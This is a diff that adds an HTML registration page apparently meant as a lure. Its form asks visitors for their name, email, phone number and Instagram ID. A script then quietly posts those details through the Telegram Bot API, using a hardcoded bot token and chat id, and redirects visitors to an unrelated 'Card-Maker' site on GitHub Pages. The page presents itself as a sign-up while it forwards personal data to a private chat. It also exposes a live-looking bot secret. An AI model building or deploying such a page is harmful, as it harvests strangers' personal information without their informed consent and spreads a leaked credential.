@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register now </title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            padding: 30px;
+            background-color: #3498db;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            color: #fff;
+        }
+
+        h1 {
+            color: #fff;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0;
+            text-align: left;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 20px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #2ecc71;
+            color: #fff;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #27ae60;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📝Register Yourself⬇
+        </h1>
+        
+        <form id="clientDetailsForm" onsubmit="return sendToTelegram()">
+            <label for="clientName">Your Name:</label>
+            <input type="text" id="clientName" name="clientName" required>
+
+            <label for="clientEmail">Your Email:</label>
+            <input type="email" id="clientEmail" name="clientEmail" required>
+
+            <label for="clientPhone">Your Phone no.:</label>
+            <input type="tel" id="clientPhone" name="clientPhone" pattern="[0-9]{10}" required>
+            <small>(Please enter a valid 10-digit phone number)</small>
+
+            <label for="clientInstagram">Your Instagram ID:</label>
+            <input type="text" id="clientInstagram" name="clientInstagram" required>
+
+            <button type="submit">create now!</button>
+        </form>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            const clientName = document.getElementById('clientName').value;
+            const clientEmail = document.getElementById('clientEmail').value;
+            const clientPhone = document.getElementById('clientPhone').value;
+            const clientInstagram = document.getElementById('clientInstagram').value;
+
+            // Check if the phone number is valid
+            if (!/^\d{10}$/.test(clientPhone)) {
+                alert('Please enter a valid 10-digit phone number.');
+                return false;
+            }
+
+            // Your Telegram Bot API details
+            const botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';
+            const chatId = '-1001590820560';
+
+            // Message to send
+            const message = `New Year clients Details:\nName: ${clientName}\nEmail: ${clientEmail}\nPhone: ${clientPhone}\nInstagram: ${clientInstagram}`;
+
+            // Send data to Telegram using the Telegram Bot API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(() => {
+                window.location.href = 'https://sgsvdbdusbswbwbs.github.io/Card-Maker/'; // Replace with your actual redirect URL
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Error in registering . Please try again.');
+            });
+
+            return false; // Prevent form submission
+        }
+    </script>
+</body>
+</html>
